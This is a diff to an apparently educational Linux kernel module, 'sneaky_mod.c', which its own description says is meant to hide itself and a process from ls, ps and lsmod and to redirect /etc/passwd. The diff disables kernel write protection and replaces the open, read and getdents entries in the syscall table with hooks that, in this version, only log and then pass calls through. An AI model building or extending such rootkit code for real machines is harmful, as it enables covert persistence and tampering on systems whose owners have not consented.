@@ -1,3 +1,12 @@
+/**
+ * Author: Prathikshaa Rangarajan
+ * Date: April 10, 2019
+ * File Name: sneaky_mod.c
+ * Description:
+ * Kernel module.
+ * Modifies open(2), getdents(2), read(2)
+ * Contains bugs. For educational purposes only.
+ */
 #include <asm/cacheflush.h>
 #include <asm/current.h> // process information
 #include <asm/page.h>
@@ -7,7 +16,10 @@
 #include <linux/kallsyms.h>
 #include <linux/kernel.h> // for printk and other kernel bits
 #include <linux/module.h> // for all modules
+#include <linux/ratelimit.h>
 #include <linux/sched.h>
+
+#define BUFFER_LEN 256
 
 #define KERN_AUTHOR "Prathikshaa Rangarajan"
 #define KERN_DESC                                                              \
@@ -15,8 +27,8 @@
   "sneaky_module from: ls, cd, find, ls /proc, ps, lsmod.\ncat /etc/passwd "   \
   "shows /tmp/passwd"
 
-// Module Param -- Take pid of sneaky process as input
-static int sneaky_pid = 0;
+static int sneaky_pid =
+    0; // Module Param -- Take pid of sneaky process as input
 module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 MODULE_PARM_DESC(sneaky_pid, "PID of sneaky process.");
 
@@ -59,17 +71,29 @@ struct linux_dirent {
   u64 d_ino;
   s64 d_off;
   unsigned short d_reclen;
-  char d_name[];
+  char d_name[BUFFER_LEN];
 };
 // getdents
 asmlinkage int (*original_getdents_call)(unsigned int fd,
-                                         struct linux_dirent *diro,
+                                         struct linux_dirent *dirp,
                                          unsigned int count);
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk(KERN_INFO "Sneaky: Open syscall\n");
+  printk_ratelimited(KERN_INFO "Sneaky: Open syscall\n");
+
   return original_open_call(pathname, flags);
+}
+
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  printk_ratelimited(KERN_INFO "Sneaky: Read syscall\n");
+  return original_read_call(fd, buf, count);
+}
+
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
+                                   unsigned int count) {
+  printk_ratelimited(KERN_INFO "Sneaky: getdents syscall\n");
+  return original_getdents_call(fd, dirp, count);
 }
 
 // The code that gets executed when the module is loaded
@@ -78,6 +102,7 @@ static int initialize_sneaky_module(void) {
 
   // See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "Sneaky process pid %d", sneaky_pid);
 
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -92,6 +117,12 @@ static int initialize_sneaky_module(void) {
   // table with the function address of our new code.
   original_open_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+  original_read_call = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+
+  original_getdents_call = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -118,6 +149,8 @@ static void exit_sneaky_module(void) {
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_open_call;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read_call;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents_call;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
